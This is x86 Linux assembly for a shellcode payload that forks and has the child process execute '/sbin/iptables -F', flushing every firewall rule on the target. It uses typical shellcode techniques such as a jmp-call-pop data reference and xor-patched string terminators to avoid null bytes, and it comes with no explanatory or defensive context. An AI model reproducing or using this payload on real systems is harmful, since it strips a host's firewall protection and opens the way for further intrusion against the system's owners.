global _start

section .text
_start:
  xor ecx,ecx 
  mul ecx
  add al,0x2 
  int 0x80 
  cmp eax,ecx 
  jnz _wait

  ;xor eax,eax ; not necessary since this is the child process, so eax will be 0
  push ecx
  jmp short get_data
got_data:
  pop ebx
  xor byte [ebx+14],0xff
  xor byte [ebx+17],0xff
  mov edx,esp
  push edx
  lea ecx, [ebx+15]
  push ecx
  push ebx
  mov ecx,esp
  add al,0xb
  int 0x80

_wait:
  xor ebx,ebx
  xchg eax,ebx
  add al,0x7 
  int 0x80

get_data:
  call got_data
  data: db "/sbin/iptables",0xff,"-F",0xff 
